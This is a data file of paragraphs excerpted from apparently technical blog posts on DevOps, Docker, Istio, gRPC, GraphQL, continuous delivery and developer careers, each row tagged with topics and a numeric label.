1513,"Be the life of the party. Programmers arent always the most social animals, but movers and shakers in the company are. If you want them to notice you, be noticeable. Invite people to lunch every day. Put a bowl of free candy on your desk. Do these things for a week and watch how many new people begin to notice you.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",0
1514,"When all is said and done, the best person for the job is not always the best programmer, it is actually the person who people relate to and trust the most. I once knew a guy who had been with the company for a month. He was a younger guy and not very good at his job, and lacked experience. Every day however, he stopped by the bosses office to make small talk and tell her a joke or two. One day, when she stepped out to use the restroom, he jumped on her computer and put photos of David Hasselhoff all over her desktop wallpaper. Instead of being fired for using a managers machine however, she thought this was clever and hilarious. A few months later, he was made the lead of our group, a group where most of the other people had 10+ more years of experience than him. Now, Im not saying to break into your bosses PC. What I am suggesting however is that attitude is king, and that you may actually find that takes you a lot further in the company than your elegant coding.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",0
1515,"Go through every point on your list, and ask how did that happen? repeatedly, until you arrive at a systemic root cause. The usual estimate is that youll need to ask how? about five times, but it can take more. Recognising when you have reached a systemic root cause can be tricky, but here are a few guidelines: A systemic problem is an enduring defect in the system, rather than a single incident. If you are still talking about particular events during this incident, keep asking how? If you havent found some people making a mistake yet, then you probably havent looked deeply enough. Most root causes have people in them somewhere. Remember that a blameless postmortem can never stop there, and must look for the systemic problems that caused the mistakes. Answers like there is this bug in the software are in this category: keep going until you understand how the bug got there without being detected.","['Sre', 'PostMortem']",4
1516,"This tutorial will attempt to show you how to deploy your Vue app using Azures App Services. This is not a tutorial on Vue or Vue-Cli. These are both great pieces of software and in the future I will try to do something on each. Additionally both are very well documented, and the best place to start leaning them is right on their main websites which are linked to above. Also this tutorial utilizes app services as basically a hosting platform for your app. In reality Azure App Services can do a ton more than just this.","['Azure', 'App Services', 'Vue']",7
1517,"Here you will see your HTTPS endpoint, Username, and Password. Also, there is the option to set up user credentials. Setting up a user is the proper way to do things, but for this tutorial we will just be using the app credentials. Now either make a not somewhere of these values or just leave the window open. Using these credentials and the FTP client of your choice, connect to the service app. Once connected, you will delete everything in the /site/wwwroot/ folder and replace it with the contents of your dist folder from your Vue app. If you are using my repo from earlier just put everything from the git repo into the wwwroot folder.","['Azure', 'App Services', 'Vue']",7
1518,"You Americans, youre all the same. Always overdressing for the wrong occasions said Major Toht (Raiders of the Lost Ark). Sometimes thats how I feel about the continuous delivery process. We overdo the delivery process for the wrong reasons. Here are 7 things to keep in mind while practicing continuous delivery: Ask yourself, How long would it take your organization to deploy a change that involves just one single line of code? We live in a world where shortened release cycles are a necessity. With agile development practices and continuous integration (CI), it is imperative for teams to have access to a stable tool which can manage the process of building, testing and deploying software as changes are made.","['Continuous Delivery', 'Software Architecture', 'Software Development', 'Software Engineering', 'Agile']",1
1519,"Configuration settings have a lifecycle completely different from that of code, while passwords and other sensitive information should not be checked into version control. Ensure that your configuration information is modular and encapsulated so that changes in one place dont have knock-on effects for other, unrelated pieces of configuration. Keep the configuration information as simple and focused as possible. This includes requirement documents, test scripts, automated test cases, network configuration scripts, deployment scripts, database creation, database maintenance scripts, technical documentation and so on. These scripts should be version-controlled, and the relevant version should be identifiable for any given buildthese change sets should have a single identifier, such as a build number or version control change set number, that references every piece.","['Continuous Delivery', 'Software Architecture', 'Software Development', 'Software Engineering', 'Agile']",18
1520,"Never go home on a broken build. For example, at 5:30 pm on a Friday, all your colleagues are leaving the office and you are itching to leave as well. You decide to check-in your code and leave. Your checked in code triggers a build and it fails. You have two options:revert the commit to a working version. Always be prepared to revert to the previous __url__ the broken test and build before you leave the door.","['Continuous Delivery', 'Software Architecture', 'Software Development', 'Software Engineering', 'Agile']",13
1521,"In order to create a reliable and repeatable process for releasing your software, we need to automate the release process as much as possible. Everything should be kept under source control. A software without adequate testing is not complete, therefore should not be released. Strive to keep the build and test process short. Build a little, test a little and deploy a littlerepeat. When multiple teams are involved in the delivery process, the feedback loop is crucial and should be visible to everyone involved. When a software is considered done, it means it is shippable, functional and fully tested.","['Continuous Delivery', 'Software Architecture', 'Software Development', 'Software Engineering', 'Agile']",13
1522,"The first place that needs consideration is the working hours. Traditionally, there are some hours that are set aside for work and a number of days as well as a given number of holidays each year. For instance, normally people go work from nine to five, and a number of organizations have the notion that they should have their employees stacked in one place. We report to work from nine to six and with only an hour break in between. The boss that we work with is constantly on us, and it is not appropriate having to go outside every other five ten minutes lest you are called aside to discuss the effects that you are adding to the group because of your countless breaks (Certo, 2015). As programmers, software engineers have to get to the office since it is mandatory that they work as a team. It might seem like the work is purely group work, yes, but at the office the team is always busy and engaged in their work, and there is literally no person that can provide you with assistance in case you are met with a difficulty, or maybe when you want to get answers to a question that has been disturbing you (Anderson, 2003). The experienced developers take this as a sign of only trying to save time rather than carrying out researches personally and keep the teams work on course without being left behind.","['Agile', 'Management', 'Software Engineering']",0
1523,"Here is a case where am working with a team that is well organized and that which is very enthusiastic and have a passionate Technology Production Manager. Other than the attitude towards the hours for working, there is a need for a quite relaxed management where the workers are allowed longer micromanaged and are as well trusted to come up with their individual plans for the organizations and to work in ways that it is them who find to be more productive. As developers, we are working in a group of four, and that explains why we are constantly collaborating so as to ensure that the output of the group is sufficient and efficient in the eyes of the demand. The kind of management that we have at the moment is an example of a modern management technique other than the hierarchical management technique that was employed in the ancient times where it was the individuals who were valued and not the subjects to superiority or their inferiority irrespective of whether they are young or old (Aurum, et al. Working as a team is one kind of modern management where young and upcoming software engineers get mentorships from the experienced team members, they get to be directed on how things are done and not only being showed by mere talk.","['Agile', 'Management', 'Software Engineering']",0
1524,"Looking at my group, we are four, and we are so much concerned about collaboration where we review the codes that we are working with as we make sure that they are as clean as possible considering that a team can be perfect, but individuals cannot be. Every day at work, we need to spend four hours working together as a team and the other four hours we take as flexible where we can use them to complete individual portions and carry out the researches. We are motivated to maintain the attention to the details and to read the documents every other time since we are out to produce impressive work, deliver the work on time and quality is mandatory meaning we need to be careful not to rush in an attempt to beat time as Shaw (2000) portrays. The overall outlook is that the balance between personal life and the work life is perfect, and this makes the first reason of motivation that we have to stick to as an organization. Every software engineer is a committed individual. They like what they are doing, and that is why they are always available to commit the much they can with respect to the part that they are respected and their work too, other than the salary and the strict agreements of contracts.","['Agile', 'Management', 'Software Engineering']",0
1525,"With a shift towards a healthy work-life balance, the idea of having health employees has translated to content employees as well as the accomplishment of the office wellness systems is borne out by the efficiency proliferations as the days are continually lost as a result of absent workers who are out due to ill health (Kuhn, 2014). The employers are picking the trend looking set to come up with a company gym membership, they are setting up health insurance and even the in-house massage and coming up with fruit systems are being set up in the workplaces. It is these aspects that make my employers modern as they are concerned about our wellbeing. Considering that as developers, we are always working as a team, when a team member is out, the output of the group is greatly affected. In the traditional management systems, the employers were having little concerns in the lives of their employees as long as they were working and beating deadlines (Pressman, 2005). Leaves were granted to sick employees to seek medical attention but there were no fruit programs or workplace gyms that would help the workers stay fit and healthy. Looking at software engineers under traditional management, group work is not put into consideration as each developer is assigned tasks that they are to work on other than be members of a team of developers like in our case.","['Agile', 'Management', 'Software Engineering']",0
1526,"The other aspect is that the software engineers are not thrilled with the point of having to tirelessly keep working and there is little to show for the hard work in terms of wages earned. The good thing is that the developers are passionate about what they are doing and as thus are lesser concerned with the wages they are accorded as long as they get their things done. At the moment, I go to work as supposed and am adhering to all the requirements and expectations, but I still have a simple salary, what keeps me going? Developers work out of passion; they do not work to build interests, neither for themselves or the organization (Zmud, 2000). The developers are aware that they have to contribute, and their features are used with customers and when they are having more customers will mean that more money and they are not interested in this even if their wages remain stagnant at the low they are in. Wages is not what drives the developers.","['Agile', 'Management', 'Software Engineering']",12
1527,"Conclusively, the motivation that flows within the team is what promotes us, and we are always encouraged to do our best on every assignment that we are tackling. Managers are not to get frustrated over the lack of quality engineers. Indeed, the traditional management is a lot stricter on time where the employees have to be at work from nine to five and have fewer coffee breaks of not more that 23. It is this aspect of traditional management in my workplace that needs to be worked on. Looking for individuals who can keep time, in most cases time alone, translates to opting to have punctual monkeys at the workplace other than have creative individuals at the workplace considering the fields where there are needs for statisticians or even advanced programmers who are handling big data and problem-solving knowledge (OShannassy, 2003). Issues come up when the employers are not ready to exploit the talent that the developers are having and their magnificent knowledge and instead look at other somewhat irrelevant aspects as such as having as fewer coffee breaks as possible. There are numerous start-ups that are growing up rapidly since they are able to tap into the technical knowledge that the developers have in the name of employing a modern management other than the traditional management that pays a little attention to the employees.","['Agile', 'Management', 'Software Engineering']",0
1528,In Traces and Emergence of Nonlinear Programming (pp.,"['Agile', 'Management', 'Software Engineering']",5
1529,"Use the Docker images command with the -a flag to locate the ID of the images you want to remove. This will show you every image, including intermediate image layers. When youve located the images you want to delete, you can pass their ID or tag to Docker rmi: List: Remove: Docker images consist of multiple layers. Dangling images are layers that have no relationship to any tagged images. They no longer serve a purpose and consume disk space. They can be located by adding the filter flag, -f with a value of dangling=true to the Docker images command. When youre sure you want to delete them, you can add the -q flag, then pass their ID to Docker rmi: Note: If you build an image without tagging it, the image will appear on the list of dangling images because it has no association with a tagged image. You can avoid this situation by providing a tag when you build, and you can retroactively tag an images with the Docker tag command.","['Docker', 'Python', 'Deep Learning', 'Machine Learning', 'Spark']",7
1530,"List: Remove: Remove Containers Using More Than One Filter Docker filters can be combined by repeating the filter flag with an additional value. This results in a list of containers that meet either condition. For example, if you want to delete all containers marked as either Created (a state which can result when you run a container with an invalid command) or Exited, you can use two filters: List: Remove: You can find all the containers that match a pattern using a combination of Docker ps and grep. When youre satisfied that you have the list you want to delete, you can use awk and xargs to supply the ID to Docker rmi. Note that these utilities are not supplied by Docker and not necessarily available on all systems: List: Remove: You can review the containers on your system with Docker ps. Adding the -a flag will show all containers. When youre sure you want to delete them, you can add the -q flag to supply the IDs to the Docker stop and Docker rm commands: List: Remove: Use the Docker volume ls command to locate the volume name or names you wish to delete. Then you can remove one or more volumes with the Docker volume rm command: List: Remove: Since the point of volumes is to exist independent from containers, when a container is removed, a volume is not automatically removed at the same time. When a volume exists, and is no longer connected to any containers, however, its called a dangling volume. To locate them to confirm you want to remove them, you can use the Docker volume ls command with a filter to limit the results to dangling volumes. When youre satisfied with the list, you can add a -q flag to provide the volume name to Docker volume rm: List: Remove: If you created an unnamed volume, it can be deleted at the same time as the container using the -v flag. Note that this only works with unnamed volumes. When the container is successfully removed, its ID is displayed. Note that no reference is made to the removal of the volume. If it is unnamed, it is silently removed from the system. If it is named, it silently stays present.","['Docker', 'Python', 'Deep Learning', 'Machine Learning', 'Spark']",7
1531,"This is a major issue with Windows platforms in my experience. Not only does it feel like pulling teeth whenever you try to get the logs on a Windows machine, but we also had the problem of being locked out of our kops-managed Windows nodes. It appears that kops created its own key pair since we didnt specify one when creating the sandbox cluster, which was problematic as we didnt have the key to decrypt the Windows password. After all this, Im of the opinion that you should only rely on Windows nodes if your software absolutely requires it and that all attempts to break that requirement have been given a fair trial. Its not all bad though, at the very least next time someone asks you: You can respond with:.","['Kubernetes', 'Windows', 'Kops', 'Docker', 'AWS']",7
1532,"The bursts between the plateau periods are commonly called upgrades. Im going to use this term to imply all the actions aimed at quick feature additions and performance improvements. At IT conferences, speakers tend to use the word upgrades to signify the key points in their systems development timelines. Upgrading a system is almost always a complex task. It often implies utilizing new technologies or rebuilding a large part of the systems code. No matter what type of development you prefer, one thing remains constant: you absolutely need to upgrade your system if you want it to stay competitive.",['Software Development'],12
1533,"Imagine you are a developer and your system has a problem. How are you going to identify the problem? What are you going to do if something fails two days after release? Should you monitor your system after rollout, or should you immediately plunge into a different project? If not you, who is going to monitor the system after release, and for how long? Is it possible to find at least one person with enough free time to do that? Finally, if something goes wrong (or you at least suspect a problem), who is going to help you? Are you going to create database queries and search through the logs yourself in order to prove your suspicions? If you have ever found yourself in this unfortunate situation, you know what it feels like. To avoid getting into it ever again, think through the negative scenarios beforehand and work out the solutions during the planning stage, while you still have plenty of time left. This way, you will know what metrics to analyze and what logs to look through when you actually find yourself pressed for time.",['Software Development'],13
1534,"Each solution comes for a cost: along with the extra flexibility, you are going to face some complications. You shouldnt let these downsides hinder your progress, though: Migrating from the old system to the new one might take much time. In the process, you essentially have to support both systems and keep the development going. The logic, the tests, the logs, the configurationspretty much everything is doubled. Its a good idea to analyze the collection of logs and metrics in the old system and think of a way to conveniently represent it in the new dashboard. You might also want to consider solving some specific tasks at the preparation stage.",['Software Development'],13
1535,"We are what makes the company. This is something I got to hear in every team Ive ever been a part of. The thing is, every team in every department thinks so. Admins, anti-fraud specialists, support team members, managers, testersall these people will tell you they are the basis of the company. This article was written by a developer, from a developers point of view, with the developer in the limelight. This doesnt mean that an admin, a manager or a tester cannot be in the center of attention. On the contrary, its good when system is surrounded by different kinds of specialists, each with his or her own opinion. But keep in mind that the tasks of other departments are inherently different from yours. It may look like youre working on one and the same problem, yet your purposes will differ. This way, having the deepest knowledge of the subject, it is the developer who has to be the driving force behind the upgrade process.",['Software Development'],0
1536,"It is my strong belief that the developer and his team should fulfill the task. Once youve got invested in something, it should become of utmost importance to you. It is you who chooses the team members. Perhaps you should get your admin, your analyst, your technical writer, and/or your support staff member on the team. In case you havent done it yet, consider picking your own team members and communicating with them during the whole development cycle. Dont hesitate to consult the analysts or any other specialists that might aid you with your cause. In an ideal world, the developer has to communicate with all other departments in the company, so that the information regarding the tasks current state flows freely both ways. This is particularly crucial for complex tasks.",['Software Development'],0
1537,"How hard would it be to replace all your secrets, right now? Lets say one of your engineers, tasked with setting up these environments, leaves the company. What damage can they do with the keys they know? What if a database password, used in a few different projects, needs to be replaced for some reasonin how many places is it used across all your repositories? Do you really want to spend half a day updating 50 repositories every time somebody leaves the company, or as a routine task every few weeks because your policy says you should rotate all secrets regularly? The only way to make your secrets more secure (given the limitation that you can not get away with not having secrets at all, AND no matter what you do to prevent it, people will be able to access them one way or another at some point) is to make them more volatile. They should be revokable at any given time, without causing much damage, and as often as possible.","['AWS', 'Devsecops', 'Gitlab Ci', 'DevOps', 'Security']",13
1538,"This will produce an artifact, which is a fancy word for any file or folder you decide to pass to later stages. In our case, we have simply created a.ci-secrets file. This file looks like this: Because we set a expire_in value, gitlab will automatically remove the artifact after 30 minutes. If your CI process take longer to run, of course you can adjust this duration. With this feature you can somewhat control the risk of leaking secrets in the long run, but it is not technically a security measure! Then, in the following steps, you can simply use the.ci-secrets file that was just created: This step effectively publishes an image on a npm repository, so this secret contains a NPM_TOKEN with write access to a package quite sensitive! Lets consider a few plausible worst case scenarios directly concerning your secrets. (I am not going to consider a scenario like somebody got access to my gitlab runner instance and can do whatever they want because of the instance role: this is a completely different security issue, not linked with exposing secrets, and should normally be taken care of at least with VPC and security group access rules. )Somebody from your organisation that you absolutely trust gets full access to the CI configuration and somehow manages to output all your precious secret variables in clear text in the CI logs, making them visible to anyone else with read access. Now one of your employees saw those, got terminated the following day, returns home and wants to hurt you badly. Since we have setup AWS Secrets Manager for auto-rotation of our keys every day, by the time they get home the token will already have been rotated. They try to use the NPM_TOKEN above, but get a 403 Forbidden error, and move on with their lives.","['AWS', 'Devsecops', 'Gitlab Ci', 'DevOps', 'Security']",7
1539,"Oh, I see This object contains this other object. So Im gonna need that too.","['Programming', 'JavaScript', 'Function', 'Tech', 'Technology']",15
1540,"But the passed Object is NOT safe! Because some other piece of code has a pointer to the Object, viz. the code that called the Constructor. It MUST have a reference to the Object otherwise it couldnt pass it to the Constructor? The Constructor will have to Clone the passed in Object. And not a shallow clone but a deep clone, i.e. every object that is contained in the passed in Object and every object in those objects and so on and so on.","['Programming', 'JavaScript', 'Function', 'Tech', 'Technology']",9
1541,"After you have deployed the app, try clicking the counter button and saving the metrics a few times. Then go to the Stackdriver console and create the charts. It may take a few minutes to propagate the metrics data. In the Stackdriver menu click Dashboards |Create Dashboard. Then in the new dashboard click Add Chart. Select the options shown in the screenshot below.","['JavaScript', 'Google Cloud Platform', 'Nodejs']",14
1542,"Notice that the values for DNS lookup time and TLS connection time are mostly zero. That is an important piece of information in itself. DNS lookup time is zero when the browser uses a cached IP address matching the domain name. The TLS connection time may be zero if the browser already has an established connection with the server or if the protocol used is QUIC. App Engine and other Google services support QUIC, which is a UDP based protocol where data can typically be sent immediately to the client. If you try from a variety of devices and browsers you should get a few non-zero values for DNS lookup and TLS connection time.","['JavaScript', 'Google Cloud Platform', 'Nodejs']",11
1543,"The example uses Open Census Tags to provide contextual information and group related metrics. The latency metrics use a phase tag, which represents the different phases of a HTTPS request: DNS lookup, TLS connection establishment, and transfer of the payload. The client tag is a placeholder for the kind of client sending the information. For example, a mobile client versus a web client. Alternatively, we could use the browser user agent for the client, which can be retrieved with the Express Request object. For example, replace the linein __url__ with After modifying the code the dashboard looks like the screenshot shown below.","['JavaScript', 'Google Cloud Platform', 'Nodejs']",11
1544,"Single page applications (SPAs) using frameworks like Angular JS, React, or V __url__ may need a slightly different approach to due to the dynamic nature of the DOM generated. For SPAs the single HTML page will only be loaded once. Changing views displayed to users in SPAs are enabled by data transferred to and from the server via XMLHttp Request (AJAX). In that context the relevant metric that should be recorded is the latency of the XMLHttp Request calls. XMLHttp Request latency is also captured in the Resource Timing API, so the same basic approach is still applicable. You may want to flush the data to the server on a regular heartbeat, so that an alert can be triggered as soon as a problem occurs.","['JavaScript', 'Google Cloud Platform', 'Nodejs']",11
1545,"Every morning I wake up between 5:00 and 6:00am. Waking up early has been one of the best decisions that Ive made while adjusting to this boot camp. The early morning hours are the best times for me to do what I want. I am able to go to the gym, play video games, catch up on social media, or just relax and watch TV with my fiance. All of these activities are even better in the early morning, because the majority of people in my area are still asleep. I can fully enjoy whatever youre doing, without the interruptions of other people.","['JavaScript', 'Productivity', 'Software Engineering', 'Codingbootcamp', 'Coding']",4
1546,"Ive never appreciated my Sundays more than I do now. This is the day where I look at my computer for less than 1020 minutes. I only hop onto my system to check my emails and announcements (if any) from Hack Reactor or my peers. Besides that, I use my Sundays to GET OUT OF THE HOUSE. Going outside and connecting with the outdoors is crucial for my well-being. Taking a 5 mile hike by the river, walking my dog around the block, going on a run, chilling at the beach, or any other outdoor activity has helped improve my state of mind extremely well. Being able to disconnect from my computer screen, and coding (though javascript thoughts still randomly pop into my head) gives my mind, my eyes and my body a chance to recover from the previous six days. At the end of the day Sunday, I feel refreshed and ready to tackle the next weeks challenges! In order to be as successful as possible in this course, I have had to make MANY adjustments to my lifestyle. I cut my weekly video gaming time in half, I rarely go out for drinks, my Saturdays are committed to class-time, and I almost never watch TV during the week. My sleep schedule changed in order to have my free time in the morning, and I make sure to be productive during every free minute that I get. As far as sacrifices go, I havent had to completely remove an aspect of my pre-bootcamp life in order to be a productive student so far. My ability to manage time and adjust my schedule has allowed me to keep up in the bootcamp, as well as continuing to do the things that I enjoy.","['JavaScript', 'Productivity', 'Software Engineering', 'Codingbootcamp', 'Coding']",4
1547,"Istio is a service mesh technology adding an abstraction layer to the network. It intercepts all or part of the traffic in a k8s cluster and executes a set of operations on it. For example, setting up smart routing or implementing a circuit breaker approach, setting up canary deployment. Moreover, Istio makes possible imposing a limit on external interactions and controlling all routes between the cluster and an external network. Furthermore, it supports setting up policy rules for controlling campaigns between different microservices. Finally, we can generate an entire network interactions map and make a unified collection of metrics completely transparent to applications.","['Docker', 'Kubernetes', 'Istio', 'Tracing', 'Distributed Tracing']",11
1548,"The istio-init container is a script that applies the iptables rules for a pod. There are two ways to configure traffic redirecting to an istio-agent container: using redirect iptables rules or TPROXY. At the writing moment, the default is using redirect rules. In istio-init, it is possible to configure which traffic will be intercepted and sent to istio-agent. For example, in order to intercept all incoming and all outgoing traffic, you need to set the parameters -iand -bto *. You can specify specific ports to be intercepted. To avoid intercepting a certain subnet, you can specify it using the -xflag.","['Docker', 'Kubernetes', 'Istio', 'Tracing', 'Distributed Tracing']",11
1549,"After init execution, the containers, including pilot-agent (envoy), are launched. It connects to the deployed Pilot by GRPC and gets information about all existing services and routing policies in the cluster. According to the received data, it configures the cluster and maps these directly to the application endpoints in the k8s cluster. There is an important moment: envoy dynamically configures listeners (IP, port pairs) that start listening. Therefore, when requests enter the pod and are redirected using iptables rules to sidecar, envoy is prepared to handle these connections and understands where to forward the proxy traffic. In this step, the information is sent to the Mixer, which we will be described below.","['Docker', 'Kubernetes', 'Istio', 'Tracing', 'Distributed Tracing']",11
1550,"Mixer has two components: istio-telemetry, istio-policy (up to version 0.8, it used to be a single component istio-mixer). Istio telemetry receives GRPC from sidecar containers and reports information about service interactions and parameters. Istio-policy accepts check requests to verify compliance with Policy rules. These policy checks are cached on the client (in a sidecar) for a certain time. Report checks are sent in batch requests. We will look at how to configure it and which parameters need to be set a bit later.","['Docker', 'Kubernetes', 'Istio', 'Tracing', 'Distributed Tracing']",11
1551,"Mixer is supposed to be a highly-available component providing uninterrupted assembly and processing of telemetry data. The system is a multi-level buffer. Initially, the data is buffered on the sidecar side of the containers, then on mixer side, and finally sent to so-called mixer backends. As a result, if any of system components fails, the buffer grows and, when the system has been restored, is flushed. Mixer backends are endpoints for sending telemetry data: statsd, newrelic and so on. Writing custom backends is easy, and later Ill show how.","['Docker', 'Kubernetes', 'Istio', 'Tracing', 'Distributed Tracing']",11
1552,"Decentralization has been on the rise lately, 2018 being a huge year when it came to software adopting its principals. With Carthage created in 2014, it could be said it was an early adopter in the software world, though decentralization in computers had been popular for quite some time, especially in cryptocurrencies. Carthage is a decentralized package manager, meaning there is no core server nor central list of projects. Instead, the package manager reaches out to various Git Hub repositories to fetch the code to be built into frameworks. While this does complicate the locating of Carthage-compatible frameworks, it does mean that Carthage is more secure, and takes advantage of a concept developers are beginning to love. Also, it does mean that Carthage can be slower than Cocoapods while reaching out for and building dependencies, but its the developers choice if the trade-offs are worth it.","['Swift', 'Programming', 'Cocoa', 'Developer', 'Package Management']",16
1553,"We used Consul for service discovery and for storing small amounts of configuration data in the Consul K/V store. Consul watches make it possible to monitor specific keys for updates and invoke a handler every time theres a change. Another option is to make use of blocking queries to long poll a Consul endpoint for updates. Being able to set a watch on a key is supported by most Chubby inspired systems, be it Zookeeper or etcd or Consul. The key in Consul was set to something along the lines of: Upon bootstrap, Sentinel read the value of the key from Consul and stored it in an in-memory data structure, in addition to setting a watch on the key. All responses to the /v3/health endpoint resulted in this in-memory data structure (a Lua table, in this specific case) being consulted before the response was formulated. Any update to the key in Consul could only be triggered by an infrastructure engineer on the team, and a watch would trigger almost immediately after the key was updated, resulting in Sentinel picking up the change and updating its in-memory configuration. All subsequent requests to /v3/health would reflect the update.","['API', 'Refactoring', 'Api Development', 'Api Integration', 'Rest Api']",8
1554,"To generate Swift Protocol Buffer and g RPC sources, well use the Swift g RPC Docker image. The benefit of using Docker to generate the sources is that we dont have to install any of the dependencies on our machines. We just take advantage of an image that is already configured for us, and its also easier to clean once were done with it. To generate the Swift code generators well run: Thats one scary command! docker run tells Docker that we want to run something using an image, in this case, one called sergiocampama/swift_grpc. One of the advantages of Docker is that it will download the image from Docker Cloud upon the first reference to it. The -i flag tells Docker to run in interactive mode by displaying the output of the command back to your terminal.","['Swift', 'Grpc']",7
1555,"Now that we have the Protocol Buffers and g RPC bindings generated, we can start implementing the server and the client. Well start by defining the Echo Server and Echo Client products in the package by modifying the P __url__ file to the following: At this point, we can already start compiling our code. For each target, Swift Package Manager will look for sources under the Sources/<Target Name> directory, which for both Echo Server and Echo Client should already have the __url__ and __url__ files: But we havent done anything useful for now. Lets implement the Echo Server logic by creating Echo/Sources/Echo Server/ __url__ file with the following contents: Lets step through what the code is doing. Skipping over the imports, we first see an Echo Provider class, which implements the Echo Service Provider protocol. This Echo Service Provider protocol is defined in Echo/Sources/Echo Server/ __url__ file. The purpose of the Echo Provider class is to implement the logic behind the service Echo Service definition in Echo/Sources/Protos/echo.proto. You can see that it only has one method, named echo (just like the rpc definition), and that it takes an Echo Request message as input and returns an Echo Response message, both defined in Echo/Sources/Echo Server/echo.pb.swift. Because this is an echo service, the response is equal to the request prepended with You sent:.","['Swift', 'Grpc']",11
1556,"Now, make sure the Echo Server is running on a terminal as described above, and on a different terminal navigate to the Echo project and run swift run Echo Client. After compiling Echo Client, it will run and if everything went ok, it should print You sent: Hello, world!. Weve successfully ran a g RPC server and client connection! With what weve accomplished at this point we could start building more complex servers and clients, but with more logic comes more potential issues that wed have to debug. Wouldnt it be nice to use a rich development IDE with debugging support for implementing the client and the server? Luckily for us, the Swift Package Manager has support for generating an Xcode project based on the P __url__ project definition. We can generate and open this project in Xcode with: Were now presented with something that should look like this: Lets add a breakpoint in the echo endpoint by clicking on the number 8 in the editor gutter, and then lets run the Echo Server target by clicking on the Play button on the top left. Make sure that to the right of that button the Echo Server target is selected. Then, while the server is running, select the Echo Client target in the dropdown list, and click the Play button again. Xcode will then run the client code in parallel with the server. This should make the client generate a connection to the server, and hit the breakpoint: With the code paused on the breakpoint, we can now inspect the contents of the request and further debug our code.","['Swift', 'Grpc']",7
1557,"Consider the N+1 problem from my previous post. Let us visualize how client server interactions happen while fetching the team details using REST endpoints: Clients make a request to fetch the team details. The response from the server might be in the following shape: This response consists of 2 players, with individual links to fetch the player responses. Now, the client will make additional 2 requests to the server to fetch the data of each player. The response for each of these requests could look like this: As you can see, if the parent response (team details) consists of N children (players data), the client now has to make N+1 requests to render this team details view, as demonstrated below: With Graph QL, you will only make a single query to fetch the necessary information, as shown below: The above query is constructed by the client and is sent to the service in a single HTTP request. The Graph QL server will then process this query and generate a response that is identical to the shape of the request. Note that the number of roundtrips made to the Data Source, remains the same. Graph QL allows batching of requests, so in fact, this could lead to fewer number of roundtrips to the Data Sources to resolve related nested fields. I will talk about Graph QL batching in subsequent posts.","['GraphQL', 'Rest Api', 'Aws Appsync', 'App Development', 'Mobile App Development']",11
1558,"When building REST based applications, we work backwards from the customer experience. Different view layouts are designed, and the transitions between these views are identified. A prototype is then built by connecting to a mock data source. This would iterate until a workflow is built with optimal user experience. We then create or consume the REST endpoints accordingly, and plugin the views to fetch the real data. Based on how the app performs, we perform client-side caching and pagination techniques.","['GraphQL', 'Rest Api', 'Aws Appsync', 'App Development', 'Mobile App Development']",6
1559,"As we saw in the previous section, Graph QL enables both client and server to evolve independently, when building new applications. Now I will list out some ways in which you can migrate your existing REST based applications to Graph QL. Before we talk about this, try and ask yourself some of these questions: Why do you want to migrate your REST endpoints to Graph QL? Is the cost measured in terms of time and resources involved in this migration justifiable to your business? Are you currently maintaining multiple versions of REST endpoints? Are there any new mobile applications in your roadmap? You should also think about the composition of your team Do you have a dedicated front end team? Are all your engineers full stack? What is the ratio of front end to back end engineers? You should consider moving to Graph QL if at least one of the following is true in your case: Your current process is tedious, and there is a lot of communication between your frontend and backend teams You are having performance issues with REST endpoints due to over-fetching or under-fetching of data Operational costs on the client is significantly increasing, due to complexity of data or with management of the existing REST endpoints There are at least 3 approaches you can think of, when transitioning to the Graph QL world:1. Rewriting/Replacing your existing HTTP web server to Graph QLThis approach is helpful if you have some REST endpoints, but dont have a lot of clients consuming these yet, or if you are planning on revamping both your service and client implementations in one go. This could be a tedious process initially as you setup new Graph QL backend and change client-side implementations, but you will see great benefits once your endpoints are migrated to Graph QL.","['GraphQL', 'Rest Api', 'Aws Appsync', 'App Development', 'Mobile App Development']",10
1560,"I was working on a small project recently to learn working with the Docker tool chain and get an idea about how things work. I decided to build (yet another) open-source Docker image of etcd and publish it on Docker Hub. Like all open-source projects, building a working Docker image was pretty straight forward and didnt really take much time. What took more time was the process to publish it nicely that someone can find it useful. And in that process, I learned a few things about working with Docker, Docker Hub and Travis and have a few questions unanswered. So I thought it might be worth documenting my findings and those unanswered questions to get feedback and improve my understanding.","['Docker', 'Travis', 'Github', 'DevOps', 'Open Source']",10
1561,"Dockerfiles ARG can be used to simplify this. ARG can be used to define variables that can be set at the time of building the image by passing the value to docker build command. Since the only difference in Dockerfiles for each version is the version itself in the URL, I could easily use this and build docker images for different versions using the same Dockerfile and the following command: Using this in Travis with environment matrix, we can build Docker images automatically for multiple versions. See this snippet __url__ for building multiple images for each version: This solves the multiple images for multiple versions problem. But we still have to address building images for each base image for each version as well.","['Docker', 'Travis', 'Github', 'DevOps', 'Open Source']",7
1562,"One additional challenge in this case is that every distribution might have its own specifics of how you do things, for example package management. Alpine and Debian use different package managers. So just using ARGs would not be enough to handle all the changes. We also need to manage how we install packages. In this case, we need a package for installation but not for running etcd. If we can somehow just get the etcd binary without anything extra, we can make the perfect Docker image.","['Docker', 'Travis', 'Github', 'DevOps', 'Open Source']",7
1563,"Multi-Stage builds simplifies some of this and gives you a way to organize your Dockerfiles better. You can add multiple stages in your Dockerfiles, building a completely separate Docker image for each stage and use additional constructs to make it simple for you to copy artifacts from one stage to another. See the bold line in this example from the docs on Docker Hub: Firstly, notice that this Dockerifle has multiple FROM instructions. Each instruction denotes a different build stage, resulting into a completely different image. The COPY instruction takes an argument called --from which can be used to copy files from other build stages. Use this to copy only what you want in your final image and leave behind everything that you dont need.","['Docker', 'Travis', 'Github', 'DevOps', 'Open Source']",7
1564,"So while we can use Travis for building all our images and running tests for every PR, we cannot use it for pushing images. And the opposite is true for Docker Hub. In fact, Docker Hubs Automated Build system in its simplest form cannot be used in our ARGs based setup because Automated Builds work with Docker context i.e. they build images for every specified path in the build settings and expects a Dockerfile present there. You cannot pass CLI arguments in this kind of a setup. So our custom docker build commands would not work with Automated Builds.","['Docker', 'Travis', 'Github', 'DevOps', 'Open Source']",7
